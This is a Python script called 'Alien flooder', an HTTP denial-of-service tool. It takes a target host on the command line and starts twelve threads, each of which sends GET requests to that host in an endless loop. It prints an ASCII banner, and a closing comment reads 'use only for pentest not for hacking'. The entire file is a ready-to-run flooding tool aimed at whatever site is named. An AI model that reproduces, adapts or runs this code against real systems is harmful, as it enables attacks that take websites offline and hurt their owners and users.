#! /usr/bin/env python
"""
Requirements:

Python 
Requests module

requests module installation in (Debian-based distribution):
sudo apt-get install python-requests

Usage :
./alien-stresser.py --host <<host>>
./alien-stresser.py --host http://www.domain.com

"""


import optparse
import time
import sys
import threading #modules importation
try:
    import requests
except ImportError: # if requests module isn't installed
	if sys.platform.startswith('linux'): #if platform is linux
		print (" please install requests  module in Debian")
		sys.exit(" sudo apt-get install python-requests ") # exit
	else: # else
		print (" install requets module for python here : https://pypi.python.org/pypi/requests/2.9.1 ")
		sys.exit() #exit
		

           
def stresser(): # stresser function
	
	parser = optparse.OptionParser(usage="./alien.py --host www.domain.com")
	parser.add_option("--host" , help=" host to flood " , action="store" , dest="host" , type="string")
	option , args = parser.parse_args()
	if option.host :
		host = ((option.host)) 
		if (host.find("http")) == -1 :
			_host = "http://" +  (host)
		elif (host.find("http")) == 0 :
			_host = (host)
	elif not option.host :
		parser.error(" alien.py require --host option  type -h for help ")
		sys.exit()
                                                                
	while (1 < 4) : #infinite loop
		try:
			requests.get(_host) # sending requests
			print (" [*] flooding {} in port 80  ".format(_host)) 
		except (requests.ConnectionError,requests.HTTPError) : #if host don't exist
			print ("[-] host don't exist  ")
			sys.exit() # exit



def _threads_(): # threading function
	 
	
	 c= threading.Thread(target=stresser) #creating threads
	 d= threading.Thread(target=stresser)
	 a= threading.Thread(target=stresser)
	 e= threading.Thread(target=stresser)
	 z= threading.Thread(target=stresser)
	 x= threading.Thread(target=stresser)
	 c1= threading.Thread(target=stresser)
	 d1= threading.Thread(target=stresser)
	 a1= threading.Thread(target=stresser)
	 e1= threading.Thread(target=stresser)
	 z1= threading.Thread(target=stresser)
	 x1= threading.Thread(target=stresser)

	 c.start() # starting threads
	 d.start()
	 a.start()
	 e.start()
	 z.start()
	 x.start()
	 c1.start()
	 d1.start()
	 a1.start()
	 e1.start()
	 z1.start()
	 x1.start()


	 
	
def main(): # main function ( most important )
	
		
	print ("""
********************************
*        _______                 * 
*     .adOOOOOOOOOba.            *
*    dOOOOOOOOOOOOOOOb           *
*   dOOOOOOOOOOOOOOOOOb          *
*  dOOOOOOOOOOOOOOOOOOOb         *
* |OOOOOOOOOOOOOOOOOOOOO|        *
* OP'~"YOOOOOOOOOOOP"~`YO        *
* OO     `YOOOOOP'     OO        *
* OOb      `OOO'      dOO        *
* YOOo      OOO      oOOP        *
*` OOOo     OOO     oOOO'        *
* ` OOOb._,dOOOb._,dOOO'         *
*  ` OOOOOOOOOOOOOOOOO'          *
*    OOOOOOOOOOOOOOOOO           *
*    YOOOOOOOOOOOOOOOP           *
*   ` OOOOOOOOOOOOOOO'           *
*    ` OOOOOOOOOOOOO'            *
*      `OOOOOOOOOOO'             *
*        `~OOOOO~'               *
**********************************
* Alien flooder (HTTP flooder)   *
**********************************      
""")  # ascii code (index)
	print ("[*] start flooding ") #info
	print ("[*] type ALT + F4 for stop flooder ") #info
		   
	time.sleep(3) # sleeping
	_threads_() # threading function start

		
main() #main function start

#end , author : Hadi999
#use only for pentest not for hacking 

